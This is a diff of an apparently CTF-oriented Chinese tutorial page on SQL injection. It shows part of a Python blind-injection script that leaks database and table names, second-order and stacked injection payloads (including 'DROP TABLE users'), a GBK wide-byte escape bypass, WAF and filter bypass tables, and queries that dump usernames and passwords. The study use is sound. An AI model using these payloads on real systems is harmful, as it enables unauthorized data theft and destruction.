+</span><span id="__span-41-25"><a id="__codelineno-41-25" name="__codelineno-41-25"></a>            <span class="k">if</span> <span class="n">is_true</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+</span><span id="__span-41-26"><a id="__codelineno-41-26" name="__codelineno-41-26"></a>                <span class="n">name</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">asc</span><span class="p">)</span>
+</span><span id="__span-41-27"><a id="__codelineno-41-27" name="__codelineno-41-27"></a>                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] </span><span class="si">{</span><span class="n">pos</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="nb">chr</span><span class="p">(</span><span class="n">asc</span><span class="p">)</span><span class="si">}</span><span class="s2"> → </span><span class="si">{</span><span class="n">name</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</span><span id="__span-41-28"><a id="__codelineno-41-28" name="__codelineno-41-28"></a>                <span class="k">break</span>
+</span><span id="__span-41-29"><a id="__codelineno-41-29" name="__codelineno-41-29"></a>        <span class="k">else</span><span class="p">:</span>
+</span><span id="__span-41-30"><a id="__codelineno-41-30" name="__codelineno-41-30"></a>            <span class="k">break</span>  <span class="c1"># 没有新字符则认为结束</span>
+</span><span id="__span-41-31"><a id="__codelineno-41-31" name="__codelineno-41-31"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[✓] Database name: </span><span class="si">{</span><span class="n">name</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</span><span id="__span-41-32"><a id="__codelineno-41-32" name="__codelineno-41-32"></a>    <span class="k">return</span> <span class="n">name</span>
+</span><span id="__span-41-33"><a id="__codelineno-41-33" name="__codelineno-41-33"></a>
+</span><span id="__span-41-34"><a id="__codelineno-41-34" name="__codelineno-41-34"></a><span class="c1"># ========== 功能 2：爆破表名（可选） ==========</span>
+</span><span id="__span-41-35"><a id="__codelineno-41-35" name="__codelineno-41-35"></a><span class="k">def</span><span class="w"> </span><span class="nf">leak_table_names</span><span class="p">():</span>
+</span><span id="__span-41-36"><a id="__codelineno-41-36" name="__codelineno-41-36"></a>    <span class="n">name</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+</span><span id="__span-41-37"><a id="__codelineno-41-37" name="__codelineno-41-37"></a>    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[*] Start leaking table names...&quot;</span><span class="p">)</span>
+</span><span id="__span-41-38"><a id="__codelineno-41-38" name="__codelineno-41-38"></a>    <span class="k">for</span> <span class="n">pos</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">100</span><span class="p">):</span>
+</span><span id="__span-41-39"><a id="__codelineno-41-39" name="__codelineno-41-39"></a>        <span class="k">for</span> <span class="n">asc</span> <span class="ow">in</span> <span class="n">ascii_range</span><span class="p">():</span>
+</span><span id="__span-41-40"><a id="__codelineno-41-40" name="__codelineno-41-40"></a>            <span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),</span><span class="si">{pos}</span><span class="s2">,1))=</span><span class="si">{asc}</span><span class="s2">)&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">pos</span><span class="o">=</span><span class="n">pos</span><span class="p">,</span> <span class="n">asc</span><span class="o">=</span><span class="n">asc</span><span class="p">)</span>
+</span><span id="__span-41-41"><a id="__codelineno-41-41" name="__codelineno-41-41"></a>            <span class="k">if</span> <span class="n">is_true</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">post_key</span><span class="o">=</span><span class="s2">&quot;id&quot;</span><span class="p">):</span>
+</span><span id="__span-41-42"><a id="__codelineno-41-42" name="__codelineno-41-42"></a>                <span class="n">name</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">asc</span><span class="p">)</span>
+</span><span id="__span-41-43"><a id="__codelineno-41-43" name="__codelineno-41-43"></a>                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] </span><span class="si">{</span><span class="n">pos</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="nb">chr</span><span class="p">(</span><span class="n">asc</span><span class="p">)</span><span class="si">}</span><span class="s2"> → </span><span class="si">{</span><span class="n">name</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</span><span id="__span-41-44"><a id="__codelineno-41-44" name="__codelineno-41-44"></a>                <span class="k">break</span>
+</span><span id="__span-41-45"><a id="__codelineno-41-45" name="__codelineno-41-45"></a>        <span class="k">else</span><span class="p">:</span>
+</span><span id="__span-41-46"><a id="__codelineno-41-46" name="__codelineno-41-46"></a>            <span class="k">break</span>
+</span><span id="__span-41-47"><a id="__codelineno-41-47" name="__codelineno-41-47"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[✓] Table names: </span><span class="si">{</span><span class="n">name</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</span><span id="__span-41-48"><a id="__codelineno-41-48" name="__codelineno-41-48"></a>    <span class="k">return</span> <span class="n">name</span>
+</span><span id="__span-41-49"><a id="__codelineno-41-49" name="__codelineno-41-49"></a>
+</span><span id="__span-41-50"><a id="__codelineno-41-50" name="__codelineno-41-50"></a><span class="c1"># ========== 爆破列名、数据内容省略 ==========</span>
+</span><span id="__span-41-51"><a id="__codelineno-41-51" name="__codelineno-41-51"></a>    <span class="c1"># ========== 主入口 ==========</span>
+</span><span id="__span-41-52"><a id="__codelineno-41-52" name="__codelineno-41-52"></a><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+</span><span id="__span-41-53"><a id="__codelineno-41-53" name="__codelineno-41-53"></a>    <span class="n">leak_database_name</span><span class="p">()</span>
+</span><span id="__span-41-54"><a id="__codelineno-41-54" name="__codelineno-41-54"></a>    <span class="c1"># leak_table_names()</span>
+</span></code></pre></div></td></tr></table></div>
+<h4 id="5">5. 二次注入<a class="headerlink" href="#5" title="Permanent link">&para;</a></h4>
 <blockquote>
 <p><strong>恶意SQL代码并不是在最初输入时就被执行，而是在后续某次对这些数据的读取或拼接中被执行</strong>。</p>
 </blockquote>
-<h4 id="_11">举个例子（注册+登录）：</h4>
+<h4 id="_11">举个例子（注册+登录）：<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h4>
 <p><strong>场景描述：</strong></p>
 <ol>
 <li>
@@ -3369,11 +3621,11 @@ if __name__ == &quot;__main__&quot;:
 <p>后台登录模块使用该用户名拼接 SQL 查询：</p>
 </li>
 </ol>
-<pre><code class="language-sql">SELECT * FROM users WHERE username = '$username' AND password = '$password'
-</code></pre>
+<div class="language-sql highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-42-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;$username&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;$password&#39;</span>
+</span></code></pre></div></td></tr></table></div>
 <p>此时变为：</p>
-<pre><code class="language-sql">SELECT * FROM users WHERE username = 'admin'# ' AND password = '123'
-</code></pre>
+<div class="language-sql highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-43-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;admin&#39;</span><span class="o">#</span><span class="w"> </span><span class="s1">&#39; AND password = &#39;</span><span class="mi">123</span><span class="err">&#39;</span>
+</span></code></pre></div></td></tr></table></div>
 <p>后半句被注释掉，实现绕过密码验证。</p>
 <p><strong>常见发生位置</strong></p>
 <table>
@@ -3404,21 +3656,21 @@ if __name__ == &quot;__main__&quot;:
 <p>由于在更改密码的操作处，没有对username进行过滤，因此此时更改密码的话，则会对admin用户进行更改</p>
 <p><img alt="image-20250628104716127" src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20250628104716127.png" /></p>
 <p>通过查看靶场源码，更新密码时，当用户名为<code>admin'#</code>时，sql语句为：</p>
-<pre><code class="language-sql">UPDATE users SET PASSWORD='$pass' where username='admin'#' and password='$curr_pass'
-</code></pre>
-<h4 id="6">6. 堆叠注入</h4>
+<div class="language-sql highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-44-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1"></a><span class="k">UPDATE</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">SET</span><span class="w"> </span><span class="n">PASSWORD</span><span class="o">=</span><span class="s1">&#39;$pass&#39;</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="o">#</span><span class="s1">&#39; and password=&#39;</span><span class="err">$</span><span class="n">curr_pass</span><span class="err">&#39;</span>
+</span></code></pre></div></td></tr></table></div>
+<h4 id="6">6. 堆叠注入<a class="headerlink" href="#6" title="Permanent link">&para;</a></h4>
 <blockquote>
 <p>在一个 SQL 查询语句后添加分号 ;，再拼接并执行另一个独立的 SQL 语句。即，一次请求中同时执行多个 SQL 语句。</p>
 </blockquote>
 <p>例如原本的 SQL 查询是：</p>
-<pre><code class="language-sql">SELECT * FROM users WHERE id = '$id';
-</code></pre>
+<div class="language-sql highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-45-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;$id&#39;</span><span class="p">;</span>
+</span></code></pre></div></td></tr></table></div>
 <p>传入：</p>
-<pre><code class="language-sql">1; DROP TABLE users;
-</code></pre>
+<div class="language-sql highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-46-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1"></a><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="k">DROP</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">users</span><span class="p">;</span>
+</span></code></pre></div></td></tr></table></div>
 <p>最终变为：</p>
-<pre><code class="language-sql">SELECT * FROM users WHERE id = '1'; DROP TABLE users;
-</code></pre>
+<div class="language-sql highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-47-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="p">;</span><span class="w"> </span><span class="k">DROP</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">users</span><span class="p">;</span>
+</span></code></pre></div></td></tr></table></div>
 <p>如果数据库配置允许堆叠执行，就会同时执行两个 SQL 语句。</p>
 <p><strong>使用条件</strong></p>
 <table>
@@ -3447,21 +3699,25 @@ if __name__ == &quot;__main__&quot;:
 </tr>
 </tbody>
 </table>
-<h4 id="7">7. 宽字节注入</h4>
+<h4 id="7">7. 宽字节注入<a class="headerlink" href="#7" title="Permanent link">&para;</a></h4>
 <blockquote>
-<p>宽字节注入是利用多字节字符编码（如 GBK、BIG5）中<strong>某些字节可以合并转义字符 \ 的特性</strong>，来绕过过滤机制，完成 SQL 注入。</p>
+<p>宽字节注入是利用多字节字符编码（如 GBK、BIG5）中<strong>某些字节可以合并转义字符  的特性</strong>，来绕过过滤机制，完成 SQL 注入。</p>
 </blockquote>
 <p><strong>常见发生场景</strong></p>
-<pre><code>Web 后端使用了 addslashes() 或 magic_quotes_gpc 来过滤单引号
-→ ' 变成了 \'
-
-正常情况下拼接后变为：' OR 1=1 → \' OR 1=1 → 注入失败
-但如果是 GBK 编码下，宽字节字符可能将 \ 和下一个字符一起解释
-</code></pre>
+<div class="language-text highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-48-1">1</a></span>
+<span class="normal"><a href="#__codelineno-48-2">2</a></span>
+<span class="normal"><a href="#__codelineno-48-3">3</a></span>
+<span class="normal"><a href="#__codelineno-48-4">4</a></span>
+<span class="normal"><a href="#__codelineno-48-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1"></a>Web 后端使用了 addslashes() 或 magic_quotes_gpc 来过滤单引号
+</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2"></a>→ &#39; 变成了 \&#39;
+</span><span id="__span-48-3"><a id="__codelineno-48-3" name="__codelineno-48-3"></a>
+</span><span id="__span-48-4"><a id="__codelineno-48-4" name="__codelineno-48-4"></a>正常情况下拼接后变为：&#39; OR 1=1 → \&#39; OR 1=1 → 注入失败
+</span><span id="__span-48-5"><a id="__codelineno-48-5" name="__codelineno-48-5"></a>但如果是 GBK 编码下，宽字节字符可能将 \ 和下一个字符一起解释
+</span></code></pre></div></td></tr></table></div>
 <p><strong>原理举例</strong></p>
 <p>PHP在开启<code>magic_quotes_gpc</code>或者使用<code>addslashes</code>、<code>iconv</code>等函数的时候，单引号<code>'</code>会被转义成<code>\'</code>。比如传入字符<code>%bf'</code>在满足上述条件的情况下会变成<code>%bf\'</code>。其中反斜杠<code>\</code>的十六进制编码是<code>%5C</code>，单引号<code>'</code>的十六进制编码是<code>%27</code>，那么就可以得出<code>%bf\'=%bf%5c%27</code>。如果程序的默认字符集是GBK等宽字节字符集，则MySQL会认为<code>%bf%5c</code>是一个宽字符，也就是<code>縗</code>。也就是说<code>%bf\'=%bf%5c%27=縗'</code>。</p>
-<h2 id="bypass">Bypass姿势</h2>
-<h3 id="_12"><strong>空格绕过</strong></h3>
+<h2 id="bypass">Bypass姿势<a class="headerlink" href="#bypass" title="Permanent link">&para;</a></h2>
+<h3 id="_12"><strong>空格绕过</strong><a class="headerlink" href="#_12" title="Permanent link">&para;</a></h3>
 <table>
 <thead>
 <tr>
@@ -3488,7 +3744,7 @@ if __name__ == &quot;__main__&quot;:
 </tr>
 </tbody>
 </table>
-<h3 id="_13"><strong>单引号/双引号绕过</strong></h3>
+<h3 id="_13"><strong>单引号/双引号绕过</strong><a class="headerlink" href="#_13" title="Permanent link">&para;</a></h3>
 <table>
 <thead>
 <tr>
@@ -3507,7 +3763,7 @@ if __name__ == &quot;__main__&quot;:
 </tr>
 </tbody>
 </table>
-<h3 id="_14"><strong>注释绕过</strong></h3>
+<h3 id="_14"><strong>注释绕过</strong><a class="headerlink" href="#_14" title="Permanent link">&para;</a></h3>
 <p><strong>目的：过滤不同注释方式</strong></p>
 <table>
 <thead>
@@ -3535,7 +3791,7 @@ if __name__ == &quot;__main__&quot;:
 </tr>
 </tbody>
 </table>
-<h3 id="_15"><strong>大小写绕过</strong></h3>
+<h3 id="_15"><strong>大小写绕过</strong><a class="headerlink" href="#_15" title="Permanent link">&para;</a></h3>
 <p><strong>目的：绕过大小写敏感的过滤器</strong></p>
 <table>
 <thead>
@@ -3551,7 +3807,7 @@ if __name__ == &quot;__main__&quot;:
 </tr>
 </tbody>
 </table>
-<h3 id="url"><strong>编码绕过（URL编码等）</strong></h3>
+<h3 id="url"><strong>编码绕过（URL编码等）</strong><a class="headerlink" href="#url" title="Permanent link">&para;</a></h3>
 <p><strong>目的：绕过 WAF 或黑名单检测</strong></p>
 <table>
 <thead>
@@ -3575,7 +3831,7 @@ if __name__ == &quot;__main__&quot;:
 </tr>
 </tbody>
 </table>
-<h3 id="_16"><strong>关键字替换绕过</strong></h3>
+<h3 id="_16"><strong>关键字替换绕过</strong><a class="headerlink" href="#_16" title="Permanent link">&para;</a></h3>
 <table>
 <thead>
 <tr>
@@ -3598,7 +3854,7 @@ if __name__ == &quot;__main__&quot;:
 </tr>
 </tbody>
 </table>
-<h3 id="_17"><strong>函数型绕过</strong></h3>
+<h3 id="_17"><strong>函数型绕过</strong><a class="headerlink" href="#_17" title="Permanent link">&para;</a></h3>
 <table>
 <thead>
 <tr>
@@ -3626,7 +3882,7 @@ if __name__ == &quot;__main__&quot;:
 </tbody>
 </table>
 <p><strong>各种大佬的绕过奇淫技巧众多，多逛优质博客能学到很多。</strong></p>
-<h2 id="_18">总结</h2>
+<h2 id="_18">总结<a class="headerlink" href="#_18" title="Permanent link">&para;</a></h2>
 <table>
 <thead>
 <tr>
@@ -3673,7 +3929,7 @@ if __name__ == &quot;__main__&quot;:
 </tr>
 </tbody>
 </table>
-<h3 id="_19">做题顺序</h3>
+<h3 id="_19">做题顺序<a class="headerlink" href="#_19" title="Permanent link">&para;</a></h3>
 <ol>
 <li>判断注入点是否存在</li>
 </ol>
@@ -3688,9 +3944,10 @@ if __name__ == &quot;__main__&quot;:
 </li>
 </ul>
 <p>使用 order by n 或 union select 1,2,... 来判断字段数量和回显位置：</p>
-<pre><code class="language-sql">?id=1' order by 3--+  
-?id=-1' union select 1,2,3--+
-</code></pre>
+<div class="language-sql highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-49-1">1</a></span>
+<span class="normal"><a href="#__codelineno-49-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1"></a><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; order by 3--+  </span>
+</span><span id="__span-49-2"><a id="__codelineno-49-2" name="__codelineno-49-2"></a><span class="s1">?id=-1&#39;</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="c1">--+</span>
+</span></code></pre></div></td></tr></table></div>
 <ol>
 <li>
 <p>识别数据库类型（比赛或做题时可跳过）</p>
@@ -3739,13 +3996,17 @@ if __name__ == &quot;__main__&quot;:
 <p>查找敏感数据</p>
 </li>
 </ol>
-<pre><code class="language-sql">SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database();
-
-SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users';
-
-SELECT username, password FROM users;
-</code></pre>
-<h3 id="_20"><strong>做题注意事项与技巧</strong></h3>
+<div class="language-sql highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-50-1">1</a></span>
+<span class="normal"><a href="#__codelineno-50-2">2</a></span>
+<span class="normal"><a href="#__codelineno-50-3">3</a></span>
+<span class="normal"><a href="#__codelineno-50-4">4</a></span>
+<span class="normal"><a href="#__codelineno-50-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="k">table_name</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="k">database</span><span class="p">();</span>
+</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2"></a>
+</span><span id="__span-50-3"><a id="__codelineno-50-3" name="__codelineno-50-3"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="k">column_name</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">table_name</span><span class="o">=</span><span class="s1">&#39;users&#39;</span><span class="p">;</span>
+</span><span id="__span-50-4"><a id="__codelineno-50-4" name="__codelineno-50-4"></a>
+</span><span id="__span-50-5"><a id="__codelineno-50-5" name="__codelineno-50-5"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="p">;</span>
+</span></code></pre></div></td></tr></table></div>
+<h3 id="_20"><strong>做题注意事项与技巧</strong><a class="headerlink" href="#_20" title="Permanent link">&para;</a></h3>
 <table>
 <thead>
 <tr>
@@ -3893,7 +4154,15 @@ SELECT username, password FROM users;
     
       <script src="../../../../../assets/javascripts/bundle.f55a23d4.min.js"></script>
       
-        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/pangu@4.0.7/dist/browser/pangu.js"></script>
+      
+        <script src="../../../../../assets/javascripts/pangu-init.js"></script>
+      
+        <script src="https://cdn.jsdelivr.net/npm/katex@0.16.10/dist/katex.min.js"></script>
+      
+        <script src="https://cdn.jsdelivr.net/npm/katex@0.16.10/dist/contrib/auto-render.min.js"></script>
+      
+        <script src="../../../../../assets/javascripts/katex-init.js"></script>
       
         <script src="../../../../../assets/document_dates/tippy/popper.min.js"></script>
       
